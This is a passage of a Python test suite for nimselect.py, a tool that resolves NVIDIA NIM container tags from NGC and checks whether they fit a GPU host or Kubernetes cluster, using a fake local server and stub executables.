# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Tests for scripts/nimselect.py: resolve, inspect and fit end to end, as subprocesses.

NGC answers come from a local HTTP server (TEST_NGC_BASE of ns_testkit.run_cli); nvidia-smi,
docker and kubectl are small fake executables written to tmp_path and found on PATH.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
from collections.abc import Iterable
from pathlib import Path
from typing import Any

import choose
import fit
import ngc_api
import nimselect
import ns_common as ns
import ns_testkit
import pytest
from ns_testkit import (
    CLOSE,
    GLM51,
    GLM_HARBOR,
    LIGHTNING_BF16,
    LIGHTNING_ID,
    LIGHTNING_NVFP4,
    LIGHTNING_NVFP4_LORA,
    SCRIPTS,
    FakeNgc,
    fake_docker,
    fixture,
    fixture_json,
    lightning_routes,
    on_path,
    run_cli,
    serve,
    set_ngc_base,
)

LLAMA_ID = "nim/meta/llama-3.1-8b-instruct"
REPO_PATH = f"/v2/repos/{LLAMA_ID}"
SEARCH_PATH = "/v2/search/catalog/resources/CONTAINER"
METADATA_PATH = "/v2/nim/metadata"
H100_PCI = "2321:10de"


def ngc_env(server: FakeNgc, **extra: str) -> dict[str, str]:
    return {"TEST_NGC_BASE": server.base, "NIM_SELECT_RETRY_DELAY": "0", **extra}


def repo_routes() -> dict[str, Any]:
    return {REPO_PATH: (200, fixture_json("ngc", "repo-llama-3.1-8b-instruct.json"))}


def h100_env(**changes: Any) -> dict[str, Any]:
    """An Environment object for the 8x H100 NVL host the fixtures came from."""
    group = {
        "name": "NVIDIA H100 NVL",
        "pci_device_id": H100_PCI,
        "pci_device_ids": [H100_PCI],
        "pci_source": "nvidia-smi",
        "memory_mib": 95830,
        "memory_gb": 100.48,
        "unified_memory": False,
        "compute_capability": "9.0",
        "count": 8,
        "idle": 8,
        "indices": list(range(8)),
        "idle_indices": list(range(8)),
        "node_count": 1,
        "driver_version": "580.126.09",
    }
    env: dict[str, Any] = {
        "schema": "nim-select/environment/v1",
        "target": "host",
        "captured_at": "2026-10-23T00:00:00Z",
        "context": None,
        "namespace": None,
        "groups": [group],
        "gpus_known": True,
        "driver_version": "580.126.09",
        "cpu_count": 256,
        "memory_gb": 2434.7,
        "arch": "amd64",
        "disk_free_gb": 500.0,
        "gpu_quota": None,
        "docker": {"present": True, "nvidia_runtime": True, "cdi": True},
        "conditions": [],
    }
    env.update(changes)
    return env


def write_env(tmp_path: Path, env: dict[str, Any]) -> Path:
    path = tmp_path / "env.json"
    path.write_text(json.dumps(env), encoding="utf-8")
    return path


def fake_tool(tmp_path: Path, name: str, body: str) -> Path:
    """A /bin/sh executable that stands in for nvidia-smi, docker or kubectl."""
    path = tmp_path / name
    path.write_text("#!/bin/sh\n" + body, encoding="utf-8")
    path.chmod(0o755)
    return path


def host_tools(tmp_path: Path, smi_csv: str = "nvidia-smi-h100nvl-8.csv") -> dict[str, str]:
    """Fake nvidia-smi and docker on PATH, and the TEST_MEMINFO hook (run_cli's runner only)."""
    fake_tool(tmp_path, "nvidia-smi", f"cat '{fixture('env', smi_csv)}'\n")
    fake_tool(tmp_path, "docker", fake_docker(fixture("env", "docker-info-h100nvl.json")) + "\n")
    return {"PATH": on_path(tmp_path), "TEST_MEMINFO": str(fixture("env", "meminfo-h100nvl.txt"))}


# `kubectl config get-contexts -o name` of the fake kubectl: `default` (k3s's one) and `c`
KUBE_CONTEXTS = "  *get-contexts*) printf 'default\\nc\\n' ;;\n"


def kube_tools(tmp_path: Path, nodes: Path | None = None) -> dict[str, str]:
    """A fake kubectl on PATH whose `get nodes` prints `nodes` (default: the k3s fixture)."""
    nodes = nodes or fixture("env", "kubectl-nodes-h100nvl.json")
    quota = '{"apiVersion": "v1", "kind": "List", "items": []}'
    fake_tool(
        tmp_path,
        "kubectl",
        f"case \"$*\" in\n{KUBE_CONTEXTS}  *resourcequota*) echo '{quota}' ;;\n"
        f"  *nodes*) cat '{nodes}' ;;\n"
        '  *) echo "unexpected kubectl call: $*" >&2; exit 1 ;;\nesac\n',
    )
    return {"PATH": on_path(tmp_path)}


# --- help -----------------------------------------------------------------------------------


@pytest.mark.parametrize("command", [[], ["locate"], ["resolve"], ["inspect"], ["fit"], ["select"]])
def test_every_command_has_help_with_an_example(command: list[str]) -> None:
    proc = subprocess.run(
        [sys.executable, str(SCRIPTS / "nimselect.py"), *command, "--help"],
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        timeout=60,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    # run as SKILL.md runs it: isolated, by its full path, with files under ~/.cache/nim-select
    assert 'Example: python3 -I "<SKILL_DIR>/scripts/nimselect.py"' in proc.stdout


def test_usage_errors_are_json() -> None:
    code, payload = run_cli("nimselect.py", "fit", "meta/llama-3.1-8b-instruct")
    assert code == 2
    assert payload["errors"][0]["code"] == "bad_input"
    assert "--env" in payload["errors"][0]["message"]


# --- resolve --------------------------------------------------------------------------------


def test_resolve_image_ref_picks_newest_version_tag(tmp_path: Path) -> None:
    out = tmp_path / "resolved.json"
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py",
            "resolve",
            "nvcr.io/nim/meta/llama-3.1-8b-instruct",
            "--out",
            str(out),
            env=ngc_env(server),
        )
    assert code == 0, payload
    assert (payload["ok"], payload["state"], payload["next"]) == (True, "resolved", "run_inspect")
    facts = payload["facts"]
    assert facts["resource_id"] == LLAMA_ID
    assert facts["model"] == "meta/llama-3.1-8b-instruct"
    assert facts["tag"] == "2.1.4"
    assert facts["image"] == "nvcr.io/nim/meta/llama-3.1-8b-instruct:2.1.4"
    assert facts["latest_tag_field"] == "latest"
    assert len(facts["tags"]) == 15
    assert facts["architectures"] == ["amd64", "arm64"]
    assert facts["image_size_gb"] == 13.82
    assert facts["nvaie_supported"] is True
    assert facts["can_guest_pull"] is True
    assert facts["mapping"] == "exact"
    assert json.loads(out.read_text(encoding="utf-8")) == facts


def test_resolve_older_tag_drops_latest_only_facts() -> None:
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py", "resolve", f"{LLAMA_ID}", "--tag", "1.15.5", env=ngc_env(server)
        )
    assert code == 0, payload
    assert payload["facts"]["tag"] == "1.15.5"
    assert payload["facts"]["tag_source"] == "requested"
    assert payload["facts"]["architectures"] is None
    assert payload["facts"]["image_size_gb"] is None


DISTILL_ID = "nim/deepseek-ai/deepseek-r1-distill-llama-8b"
# Its NGC record on 2026-11-04: latestTag is an RTX build, not the newest version 1.5.2.
DISTILL_REPO = {
    "name": "deepseek-r1-distill-llama-8b",
    "tags": ["1.8.0-RTX", "1.5.2", "1", "latest", "1.5"],
    "latestTag": "1.8.0-RTX",
    "latestArchitectureVariants": [{"os": "linux", "architecture": "amd64"}],
    "latestImageSize": 9785475578,
}


def test_resolve_takes_no_latest_facts_from_another_build() -> None:
    """NGC's latest* fields describe the image tagged latestTag. When that is another build than
    the newest version, the newest image's architectures and size are not recorded."""
    with serve({f"/v2/repos/{DISTILL_ID}": (200, DISTILL_REPO)}) as server:
        code, payload = run_cli("nimselect.py", "resolve", DISTILL_ID, env=ngc_env(server))
        assert code == 0, payload
        facts = payload["facts"]
        assert (facts["tag"], facts["latest_tag_field"]) == ("1.5.2", "1.8.0-RTX")
        assert (facts["architectures"], facts["image_size_gb"]) == (None, None)
        code, payload = run_cli(
            "nimselect.py", "resolve", DISTILL_ID, "--tag", "1.8.0-RTX", env=ngc_env(server)
        )
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["architectures"], facts["image_size_gb"]) == (["amd64"], 9.79)


# A hotfix pushed to an older line after the newest version: latestTag 1.15.6 is newer than 2.1.4
# by date, and NGC's latest* fields describe that arm64 hotfix image only.
HOTFIX_REPO = {
    "name": "llama-3.1-8b-instruct",
    "tags": ["2.1.4", "2.0.13", "1.15.6", "1.15.5", "latest"],
    "latestTag": "1.15.6",
    "latestArchitectureVariants": [{"os": "linux", "architecture": "arm64"}],
    "latestImageSize": 8_123_456_789,
}


def test_a_hotfix_on_an_older_line_lends_the_newest_no_latest_facts() -> None:
    """The newest version 2.1.4 gets neither the CPU architectures nor the size of latestTag
    1.15.6, an older line's hotfix pushed later: whether the image list is public or not, and
    whether it lists 2.1.4 or not. 1.15.6 itself keeps them."""
    hidden = nimselect.ImageList(LLAMA_ID, {}, NOT_PUBLIC)
    for listed in (hidden, nimselect.ImageList(LLAMA_ID, {})):
        assert nimselect.image_facts(HOTFIX_REPO, "2.1.4", listed) == (None, None, None)
        assert nimselect.image_facts(HOTFIX_REPO, "1.15.6", listed) == (["arm64"], 8123456789, None)
    own = nimselect.ImageList(LLAMA_ID, {"2.1.4": ngc_api.Image("sha256:a", ("amd64",), 13)})
    assert nimselect.image_facts(HOTFIX_REPO, "2.1.4", own) == (["amd64"], 13, None)
    routes = {REPO_PATH: (200, HOTFIX_REPO), f"{REPO_PATH}/images": FORBIDDEN}
    with serve(routes) as server:
        code, payload = run_cli("nimselect.py", "resolve", LLAMA_ID, env=ngc_env(server))
        assert code == 0, payload
        facts = payload["facts"]
        assert (facts["tag"], facts["latest_tag_field"]) == ("2.1.4", "1.15.6")
        assert (facts["architectures"], facts["image_size_gb"]) == (None, None)
        assert not any("taken to be the same image" in note for note in facts["notes"])
        code, payload = run_cli(
            "nimselect.py", "resolve", LLAMA_ID, "--tag", "1.15.6", env=ngc_env(server)
        )
    assert code == 0, payload
    assert (payload["facts"]["architectures"], payload["facts"]["image_size_gb"]) == (
        ["arm64"],
        8.12,
    )


NOT_PUBLIC = "NGC answered HTTP 403 for the images of nim/x/y (requestId r)"


@pytest.mark.parametrize(
    ("latest", "tag", "recorded", "assumed"),
    [
        ("1", "1.7.0-variant", True, True),
        ("1.7-variant", "1.7.0-variant", True, True),
        ("latest", "1.7.0-variant", True, True),
        ("1.6.0-variant", "1.6.0-variant", True, False),
        ("1.8.0-RTX", "1.7.0-variant", False, False),
        ("1", "1.6.0-variant", False, False),
        (None, "1.7.0-variant", False, False),
    ],
)
def test_the_record_is_used_only_without_the_image_list(
    latest: str | None, tag: str, recorded: bool, assumed: bool
) -> None:
    """The record is latestTag's image. Without a public image list it is also used for the
    newest tag when latestTag is `latest` or an alias of it (nim/qwen/qwen3.5-35b-a3b: latestTag
    `1`, newest `1.7.0-variant`), with a note, never for another build or an older tag. With the
    list, each tag's own entry is used."""
    repo = {
        "tags": ["latest", "1.8.0-RTX", "1.7.0-variant", "1.7", "1", "1.6.0-variant"],
        "latestTag": latest,
        "latestArchitectureVariants": [
            {"os": "linux", "architecture": "arm64"},
            {"os": "linux", "architecture": "amd64"},
            {"os": "unknown", "architecture": "unknown"},
        ],
        "latestImageSize": 9599378789,
    }
    hidden = nimselect.ImageList("nim/x/y", {}, NOT_PUBLIC)
    archs, size, note = nimselect.image_facts(repo, tag, hidden)
    assert archs == (["amd64", "arm64"] if recorded else None)
    assert size == (9599378789 if recorded else None)
    assert (note is not None) is assumed
    if assumed:
        assert NOT_PUBLIC in note and "taken to be the same image" in note
    # a public list: the tag's own entry, or nothing but the record of latestTag itself
    own = ngc_api.Image("sha256:own", ("amd64",), 14887375363)
    public = nimselect.ImageList("nim/x/y", {tag: own})
    assert nimselect.image_facts(repo, tag, public) == (["amd64"], 14887375363, None)
    empty = nimselect.ImageList("nim/x/y", {})
    expected = (["amd64", "arm64"], 9599378789, None) if tag == latest else (None, None, None)
    assert nimselect.image_facts(repo, tag, empty) == expected


GPT_OSS_ID = "nim/openai/gpt-oss-20b"
# Its record on 2026-11-04: `latest` is 2.1.6, which the record's tags do not list yet.
GPT_OSS_REPO = {
    "name": "gpt-oss-20b",
    "tags": ["2.1.5", "2.1.4", "2.0.13", "latest", "1.12", "1"],
    "latestTag": "latest",
    "latestArchitectureVariants": [
        {"os": "linux", "architecture": "arm64"},
        {"os": "linux", "architecture": "amd64"},
    ],
    "latestImageSize": 11975569582,
}


def gpt_oss_images(arch_2_1_5: list[str]) -> tuple[int, dict[str, Any]]:
    """GET /repos/nim/openai/gpt-oss-20b/images: `latest` is 2.1.6, another image than 2.1.5."""

    def image(tag: str, digest: str, size: int, archs: list[str]) -> dict[str, Any]:
        variants = [{"os": "linux", "architecture": a} for a in archs]
        return {"tag": tag, "digest": digest, "size": size, "architectureVariants": variants}

    return 200, {
        "images": [
            image("latest", "sha256:741f74f7c810", 11975569582, BOTH),
            image("2.1.6", "sha256:741f74f7c810", 11975569582, BOTH),
            image("2.1.5", "sha256:5c77e2409b41", 14887375363, arch_2_1_5),
            image("2.1.4", "sha256:2cdad79674fc", 13819791260, BOTH),
        ]
    }


def test_resolve_takes_the_tags_own_image_from_the_list() -> None:
    """latestTag is `latest`, but `latest` is 2.1.6 and the newest listed tag is 2.1.5: its own
    entry gives 14.89 GB, not the record's 11.98 GB."""
    routes = {
        f"/v2/repos/{GPT_OSS_ID}": (200, GPT_OSS_REPO),
        f"/v2/repos/{GPT_OSS_ID}/images": gpt_oss_images(BOTH),
    }
    with serve(routes) as server:
        code, payload = run_cli("nimselect.py", "resolve", GPT_OSS_ID, env=ngc_env(server))
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["tag"], facts["latest_tag_field"]) == ("2.1.5", "latest")
    assert (facts["architectures"], facts["image_size_gb"]) == (BOTH, 14.89)
    assert not any("taken to be the same image" in note for note in facts["notes"])


UNAVAILABLE = (503, {"requestStatus": {"statusCode": "UNAVAILABLE", "requestId": "req-503"}})


@pytest.mark.parametrize(
    ("answer", "problem"),
    [
        (CLOSE, "Remote end closed connection without response"),
        ((200, {}), "without an images list"),
        (UNAVAILABLE, "HTTP 503"),
    ],
    ids=["connection-closed", "not-an-image-list", "503-after-retries"],
)
def test_an_image_list_that_cannot_be_read_is_left_out(answer: Any, problem: str) -> None:
    """The image list is optional: when it cannot be read even though the repository just was,
    resolve goes on with the repository record and says why, as for a 403."""
    routes = {**repo_routes(), f"{REPO_PATH}/images": answer}
    with serve(routes) as server:
        code, payload = run_cli("nimselect.py", "resolve", LLAMA_ID, env=ngc_env(server))
        requested = list(server.requests)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["tag"], facts["architectures"], facts["image_size_gb"]) == ("2.1.4", BOTH, 13.82)
    [note] = [n for n in facts["notes"] if problem in n]
    assert "come from the repository record of the image tagged latest" in note
    attempts = 1 if answer[0] == 200 else 3
    assert requested.count(f"{REPO_PATH}/images") == attempts


def test_a_503_on_the_image_list_is_retried_and_its_digests_used() -> None:
    """The image list answers 503, then 200: its digests say `1.8` is still the 1.8.1 image, so
    1.8.1 stays the newest (by its version numbers alone, `1.8` would be 1.8.3-variant)."""
    rid = "nim/nvidia/nemotron-3-super-120b-a12b-experimental"
    tags = ["1.8.3-variant", "1.8", "1.8.1", "latest"]
    repo = {"name": rid.rsplit("/", 1)[-1], "tags": tags, "latestTag": "latest"}
    images = same_image(["1.8", "1.8.1"], "sha256:a7e96e45d2ad")[1]["images"]
    images += same_image(["1.8.3-variant", "latest"], "sha256:e8355971fc7e")[1]["images"]
    listed = [UNAVAILABLE, (200, {"images": images})]
    routes = {f"/v2/repos/{rid}": (200, repo), f"/v2/repos/{rid}/images": listed}
    with serve(routes) as server:
        code, payload = run_cli("nimselect.py", "resolve", rid, env=ngc_env(server))
        requested = list(server.requests)
    assert code == 0, payload
    assert (payload["facts"]["tag"], payload["facts"]["architectures"]) == ("1.8.1", BOTH)
    assert requested.count(f"/v2/repos/{rid}/images") == 2


def test_a_size_that_is_not_a_finite_number_is_not_recorded() -> None:
    """latestImageSize NaN, which Python's JSON parser accepts: no size, and still one JSON
    object rather than a traceback."""
    repo = fixture_json("ngc", "repo-llama-3.1-8b-instruct.json")
    routes = {REPO_PATH: (200, {**repo, "latestImageSize": float("nan")})}
    routes[f"{REPO_PATH}/images"] = FORBIDDEN
    with serve(routes) as server:
        code, payload = run_cli("nimselect.py", "resolve", LLAMA_ID, env=ngc_env(server))
    assert code == 0, payload
    assert (payload["facts"]["architectures"], payload["facts"]["image_size_gb"]) == (BOTH, None)
    hidden = nimselect.ImageList(LLAMA_ID, {}, NOT_PUBLIC)
    for size in (float("inf"), "13819792120", True):
        record = {"latestTag": "latest", "latestImageSize": size}
        assert nimselect.image_facts(record, "latest", hidden) == (None, None, None)


def test_select_checks_the_tags_own_architectures_not_the_record_of_latest(
    tmp_path: Path,
) -> None:
    """arm64 host; the record of `latest` lists arm64, but 2.1.5 is amd64 only."""
    routes = {
        f"/v2/repos/{GPT_OSS_ID}": (200, GPT_OSS_REPO),
        f"/v2/repos/{GPT_OSS_ID}/images": gpt_oss_images(["amd64"]),
        SEARCH_PATH: (200, search_body(GPT_OSS_ID)),
        meta_key(GPT_OSS_ID, "2.1.5"): FITS,
    }
    code, payload, requested = run_select(
        tmp_path, routes, GPT_OSS_ID, "--max-images", "1", env=h100_env(arch="arm64")
    )
    assert code == 0, payload
    assert considered(payload) == [("2.1.5", "newest", "published", "does_not_fit")]
    assert payload["facts"]["rejected"]["counts"] == {"cpu_arch_unsupported": 1}
    assert f"/v2/repos/{GPT_OSS_ID}/images" in requested


def test_resolve_latest_is_replaced_by_a_version() -> None:
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py", "resolve", "meta/llama-3.1-8b-instruct:latest", env=ngc_env(server)
        )
    assert code == 0, payload
    assert payload["facts"]["tag"] == "2.1.4"
    assert payload["facts"]["notes"]


def test_resolve_bare_repo_name_searches_and_takes_the_exact_name() -> None:
    routes = {SEARCH_PATH: (200, fixture_json("ngc", "search-llama.json")), **repo_routes()}
    with serve(routes) as server:
        code, payload = run_cli(
            "nimselect.py", "resolve", "llama-3.1-8b-instruct", env=ngc_env(server)
        )
        requested = list(server.requests)
    assert code == 0, payload
    assert payload["facts"]["resource_id"] == LLAMA_ID
    assert any(path.startswith(SEARCH_PATH) for path in requested)


def test_resolve_free_text_with_many_matches_asks_the_user() -> None:
    routes = {SEARCH_PATH: (200, fixture_json("ngc", "search-llama.json"))}
    with serve(routes) as server:
        code, payload = run_cli("nimselect.py", "resolve", "llama", env=ngc_env(server))
    assert code == 3
    assert (payload["ok"], payload["state"], payload["next"]) == (False, "resolve", "ask_user")
    assert payload["errors"][0]["code"] == "model_ambiguous"
    candidates = payload["facts"]["candidates"]
    assert 1 < len(candidates) <= 10
    assert LLAMA_ID in {c["resource_id"] for c in candidates}


def llama4_search() -> dict[str, Any]:
    """A search answer as NGC gives it for "llama 4 scout": any word matches, so Llama 4 Scout comes
    with Llama 4 Maverick and other NIMs that have a 4 in their names."""

    def resource(rid: str, display: str) -> dict[str, Any]:
        return {"resourceId": rid, "name": rid.rsplit("/", 1)[-1], "displayName": display}

    found = [
        resource("nim/meta/llama-4-scout-17b-16e-instruct", "Llama 4 Scout 17B 16E Instruct"),
        resource("nim/meta/llama-4-maverick-17b-128e-instruct", "Llama 4 Maverick 17B 128E Instruct"),
        resource("nim/nvidia/nemotron-4-340b-instruct", "nemotron-4-340b-instruct"),
        resource("nim/microsoft/phi-4-mini-instruct", "phi-4-mini-instruct"),
    ]
    group = {"groupValue": "CONTAINER", "resources": found}
    return {"resultTotal": 4, "resultPageTotal": 1, "results": [group]}


SCOUT_ID = "nim/meta/llama-4-scout-17b-16e-instruct"


@pytest.mark.parametrize(
    ("query", "note"),
    [
        # only one result has every word: picked, and a note says so
        ("Llama 4 Scout", True),
        ("scout", True),
        # the catalog's display name is an exact match: no note needed
        ("Llama 4 Scout 17B 16E Instruct", False),
    ],
)
def test_resolve_takes_the_one_search_result_with_every_word(query: str, note: bool) -> None:
    repo = fixture_json("ngc", "repo-llama-3.1-8b-instruct.json")
    repo["name"] = SCOUT_ID.rsplit("/", 1)[-1]
    routes = {SEARCH_PATH: (200, llama4_search()), f"/v2/repos/{SCOUT_ID}": (200, repo)}
    with serve(routes) as server:
        code, payload = run_cli("nimselect.py", "resolve", query, env=ngc_env(server))
    assert code == 0, payload
    assert payload["facts"]["resource_id"] == SCOUT_ID
    noted = [n for n in payload["facts"]["notes"] if "has every word of it" in n]
    assert bool(noted) is note
    if note:
        assert f"only {SCOUT_ID} has every word" in noted[0] and "returned 4 NIMs" in noted[0]


def test_resolve_shows_the_results_with_every_word_first_when_several_have_them() -> None:
    with serve({SEARCH_PATH: (200, llama4_search())}) as server:
        code, payload = run_cli("nimselect.py", "resolve", "llama 4", env=ngc_env(server))
    assert code == 3, payload
    error = payload["errors"][0]
    assert error["code"] == "model_ambiguous" and error["message"].startswith("2 NIMs match")
    assert [c["resource_id"] for c in payload["facts"]["candidates"]] == [
        SCOUT_ID,
        "nim/meta/llama-4-maverick-17b-128e-instruct",
    ]


def test_resolve_ambiguous_name_with_a_tag_picks_the_one_nim_that_has_it() -> None:
    search = fixture_json("ngc", "search-llama.json")
    with_tag = fixture_json("ngc", "repo-llama-3.1-8b-instruct.json")
    without = {**with_tag, "tags": ["1.0.0"], "latestTag": "1.0.0"}
    routes: dict[str, Any] = {SEARCH_PATH: (200, search), **repo_routes()}
    for group in search["results"]:
        for resource in group["resources"]:
            if resource["resourceId"] != LLAMA_ID:
                routes[f"/v2/repos/{resource['resourceId']}"] = (200, without)
    with serve(routes) as server:
        code, payload = run_cli(
            "nimselect.py", "resolve", "llama", "--tag", "2.1.4", env=ngc_env(server)
        )
    assert code == 0, payload
    assert (payload["facts"]["resource_id"], payload["facts"]["tag"]) == (LLAMA_ID, "2.1.4")
    notes = payload["facts"]["notes"]
    assert any(f"only {LLAMA_ID} has tag 2.1.4" in note for note in notes)


def test_resolve_ambiguous_name_with_a_tag_several_have_still_asks() -> None:
    search = fixture_json("ngc", "search-llama.json")
    repo = fixture_json("ngc", "repo-llama-3.1-8b-instruct.json")
    routes: dict[str, Any] = {SEARCH_PATH: (200, search)}
    for group in search["results"]:
        for resource in group["resources"]:
            routes[f"/v2/repos/{resource['resourceId']}"] = (200, repo)
    with serve(routes) as server:
        code, payload = run_cli(
            "nimselect.py", "resolve", "llama", "--tag", "2.1.4", env=ngc_env(server)
        )
    assert code == 3
    assert payload["errors"][0]["code"] == "model_ambiguous"


def test_resolve_unknown_repo_is_not_found() -> None:
    with serve({}) as server:
        code, payload = run_cli(
            "nimselect.py", "resolve", "nim/meta/does-not-exist-xyz", env=ngc_env(server)
        )
    assert code == 3
    assert payload["next"] == "ask_user"
    assert payload["errors"][0]["code"] == "model_not_found"


def test_resolve_search_without_results_is_not_found() -> None:
    empty = {"resultTotal": 0, "resultPageTotal": 0, "results": []}
    with serve({SEARCH_PATH: (200, empty)}) as server:
        code, payload = run_cli("nimselect.py", "resolve", "no such model", env=ngc_env(server))
    assert code == 3
    assert payload["errors"][0]["code"] == "model_not_found"


def test_resolve_missing_tag_lists_tags() -> None:
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py", "resolve", LLAMA_ID, "--tag", "9.9.9", env=ngc_env(server)
        )
    assert code == 3
    assert payload["next"] == "ask_user"
    assert payload["errors"][0]["code"] == "tag_not_found"


def test_resolve_two_different_tags_is_bad_input() -> None:
    code, payload = run_cli(
        "nimselect.py", "resolve", f"nvcr.io/{LLAMA_ID}:2.1.4", "--tag", "1.15.5"
    )
    assert code == 2
    assert payload["errors"][0]["code"] == "tag_conflict"


def test_resolve_mirror_maps_by_name_with_a_warning() -> None:
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py",
            "resolve",
            "registry.example.com/nim/meta/llama-3.1-8b-instruct:2.1.4",
            env=ngc_env(server),
        )
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["resource_id"], facts["tag"], facts["mapping"]) == (LLAMA_ID, "2.1.4", "by_name")
    assert facts["source_registry"] == "registry.example.com"
    assert any("same name and tag" in w for w in facts["warnings"])


def test_resolve_unreachable_ngc_is_an_external_failure() -> None:
    with serve({}) as server:
        dead = ngc_env(server)
    code, payload = run_cli("nimselect.py", "resolve", LLAMA_ID, env=dead)
    assert code == 4
    assert payload["next"] == "fix_errors"
    assert payload["errors"][0]["code"] == "ngc_unreachable"


# --- inspect --------------------------------------------------------------------------------


def test_inspect_host_with_fake_tools(tmp_path: Path) -> None:
    out = tmp_path / "env.json"
    code, payload = run_cli(
        "nimselect.py",
        "inspect",
        "--cache-dir",
        str(tmp_path),
        "--out",
        str(out),
        env=host_tools(tmp_path),
    )
    assert code == 0, payload
    assert (payload["state"], payload["next"]) == ("inspected", "run_fit")
    env = payload["facts"]
    assert env["schema"] == "nim-select/environment/v1"
    assert env["target"] == "host"
    assert env["gpus_known"] is True
    [group] = env["groups"]
    assert (group["pci_device_id"], group["count"], group["idle"]) == (H100_PCI, 8, 8)
    # decimal GB cut (not rounded) to 2 decimals so VRAM is never overstated: 100.485 -> 100.48
    assert group["memory_gb"] == 100.48
    assert env["driver_version"] == "580.126.09"
    assert env["memory_gb"] == 2434.69  # the TEST_MEMINFO file, not this machine's /proc/meminfo
    assert env["docker"] == {"present": True, "nvidia_runtime": True, "cdi": False}
    assert json.loads(out.read_text(encoding="utf-8")) == env


def test_inspect_host_gpu_subset(tmp_path: Path) -> None:
    code, payload = run_cli(
        "nimselect.py",
        "inspect",
        "--gpus",
        "0,1",
        "--cache-dir",
        str(tmp_path),
        env=host_tools(tmp_path),
    )
    assert code == 0, payload
    assert payload["facts"]["groups"][0]["count"] == 2


def test_inspect_mig_host_asks_the_user(tmp_path: Path) -> None:
    rows = fixture("env", "nvidia-smi-h100nvl-8.csv").read_text(encoding="utf-8")
    mig = tmp_path / "mig.csv"
    mig.write_text(rows.replace("Disabled", "Enabled"), encoding="utf-8")
    tools = host_tools(tmp_path)
    fake_tool(tmp_path, "nvidia-smi", f"cat '{mig}'\n")
    code, payload = run_cli("nimselect.py", "inspect", "--cache-dir", str(tmp_path), env=tools)
    assert code == 0, payload
    assert payload["facts"]["gpus_known"] is False
    assert payload["next"] == "ask_user"


def test_inspect_rejects_bad_gpu_list(tmp_path: Path) -> None:
    code, payload = run_cli("nimselect.py", "inspect", "--gpus", "first", env=host_tools(tmp_path))
    assert code == 2
    assert payload["errors"][0]["code"] == "bad_gpus"


def test_inspect_host_rejects_kube_flags(tmp_path: Path) -> None:
    code, payload = run_cli("nimselect.py", "inspect", "--context", "a", env=host_tools(tmp_path))
    assert code == 2
    assert payload["errors"][0]["code"] == "bad_input"


def test_inspect_without_nvidia_smi_is_a_precondition(tmp_path: Path) -> None:
    tools = host_tools(tmp_path)
    (tmp_path / "nvidia-smi").unlink()
    tools["PATH"] = str(tmp_path)  # docker is there, nvidia-smi is not
    code, payload = run_cli("nimselect.py", "inspect", "--cache-dir", str(tmp_path), env=tools)
    assert code == 3
    assert payload["errors"][0]["code"] == "nvidia_smi_missing"


def test_inspect_k8s_with_fake_kubectl(tmp_path: Path) -> None:
    code, payload = run_cli(
        "nimselect.py",
        "inspect",
        "--target",
        "k8s",
        "--context",
        "default",
        "--namespace",
        "nim",
        env=kube_tools(tmp_path),
    )
    assert code == 0, payload
    env = payload["facts"]
    assert (env["target"], env["context"], env["namespace"]) == ("k8s", "default", "nim")
    assert env["gpus_known"] is True
    [group] = env["groups"]
    assert group["count"] == 8
    assert H100_PCI in group["pci_device_ids"]
    assert group["pci_source"] == "product-table"


def test_inspect_k8s_with_a_context_the_kubeconfig_lacks_asks_the_user(tmp_path: Path) -> None:
    """The user named prod-gpu, but the kubeconfig has only default and c: inspect asks no
    cluster, never falls back to the current context, and names the contexts it has."""
    out = tmp_path / "env.json"
    code, payload = run_cli(
        "nimselect.py",
        "inspect",
        "--target",
        "k8s",
        "--context",
        "prod-gpu",
        "--namespace",
        "nim",
        "--out",
        str(out),
        env=kube_tools(tmp_path),
    )
    assert (code, payload["ok"], payload["state"], payload["next"]) == (
        3,
        False,
        "inspect",
        "ask_user",
    )
    [error] = payload["errors"]
    assert error["code"] == "context_not_found" and "never pick one" in error["fix"]
    assert payload["facts"] == {"contexts": ["default", "c"]}
    assert not out.exists()


@pytest.mark.parametrize(
    "flags", [["--context", "default"], ["--namespace", "nim"], []], ids=["no-ns", "no-ctx", "none"]
)
def test_inspect_k8s_needs_context_and_namespace(tmp_path: Path, flags: list[str]) -> None:
    code, payload = run_cli(
        "nimselect.py", "inspect", "--target", "k8s", *flags, env=kube_tools(tmp_path)
    )
    assert code == 2
    assert payload["next"] == "ask_user"
    assert payload["errors"][0]["code"] == "context_required"


def test_inspect_k8s_checks_a_named_context_before_asking_for_the_namespace(
    tmp_path: Path,
) -> None:
    """Only a context is named, and the kubeconfig lacks it: inspect says so with the contexts it
    has, so the agent asks for the context and the namespace in one question, not one after the
    other."""
    code, payload = run_cli(
        "nimselect.py",
        "inspect",
        "--target",
        "k8s",
        "--context",
        "prod-gpu",
        env=kube_tools(tmp_path),
    )
    assert (code, payload["next"]) == (3, "ask_user")
    assert payload["errors"][0]["code"] == "context_not_found"
    assert payload["facts"] == {"contexts": ["default", "c"]}


# --- fit ------------------------------------------------------------------------------------


def metadata_file(name: str = "metadata-llama-3.1-8b-instruct-2.1.4.json") -> str:
    return str(fixture("ngc", name))


def assert_fits_with_handoff(payload: dict[str, Any]) -> dict[str, Any]:
    assert (payload["ok"], payload["state"], payload["next"]) == (
        True,
        "fits",
        "confirm_with_user",
    )
    facts = payload["facts"]
    recommended = facts["recommended"]
    assert recommended["verdict"] == "fits"
    assert recommended["precision"] == "fp8"
    assert recommended["tier"] == "tested"
    assert recommended["gpus_required"] == 1
    assert facts["handoff"] == {
        "model": "meta/llama-3.1-8b-instruct",
        "image": "nvcr.io/nim/meta/llama-3.1-8b-instruct:2.1.4",
        "model_profile": recommended["profile_id"],
        "verdict": "fits",
        "backend": "vllm",
        "gpus": "device=0",
        "gpu_ids": [0],
        "gpu_count": 1,
